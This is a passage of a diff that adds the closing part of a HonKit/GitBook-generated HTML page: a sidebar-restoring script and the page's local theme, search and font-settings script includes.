+            var book = document.querySelector(".book");
+            // Show sidebar if it enabled
+            if (sidebarState && book) {
+                book.classList.add("without-animation", "with-summary");
+            }
+        }
+
+        try {
+            __init__restoreLastSidebarState();
+        } finally {
+            var book = document.querySelector(".book");
+            book.classList.remove("honkit-cloak");
+        }
+    </script>
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
